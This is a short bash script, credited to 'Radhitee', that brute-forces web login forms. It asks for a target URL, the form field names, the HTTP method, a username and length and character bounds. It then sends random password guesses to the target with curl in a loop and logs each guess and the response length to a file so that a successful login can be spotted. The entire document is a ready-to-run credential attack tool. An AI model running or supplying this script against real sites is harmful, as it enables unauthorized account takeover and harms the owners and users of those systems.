#!/bin/bash

echo "---------------------------"
echo "Password Brute Force Script"
echo "      By Radhitee          "
echo "---------------------------"

read -p "Enter the URL: " url
read -p "Enter parameter for username: " username_param
read -p "Enter parameter for password: " password_param


read -p "Choose HTTP method (1->POST / 2->GET): " http_method
if [ "$http_method" == "1" ]; then
    method="POST"
elif [ "$http_method" == "2" ]; then
    method="GET"
else
    echo "Invalid HTTP method!"
    exit 1
fi

read -p "Enter the username: " username
read -p "Enter the minimum length of text: " min_length_text
read -p "Enter the maximum length of text: " max_length_text
read -p "Enter the pattern text: " pattern_text
read -p "Enter the number of attempts: " num_attempts

output_file="password_checker.txt"

echo "Starting brute force..."
echo "------------------------"
echo "URL : $url"
echo "Method : $method"
echo "Data : $username_param=$username&$password_param="
echo "------------------------"

for ((i=1; i<=num_attempts; i++)); do
    length_text=$(( min_length_text + RANDOM % (max_length_text - min_length_text + 1) ))
    random_text=$(head /dev/urandom | LC_ALL=C tr -dc "$pattern_text" | head -c"$length_text")
    data="$username_param=$username&$password_param=$random_text"
    
    response=$(curl -s -X $method -d "$data" "$url")
    response_length=$(echo -n "$response" | wc -c)
    echo "Attempt $i | Password : $random_text | Response Length : $response_length" 
    
    echo "Attempt $i | Password : $random_text | Response Length : $response_length"  >> "$output_file"
done

echo "Brute force completed with $((i-1)) tries . Results saved in $output_file"
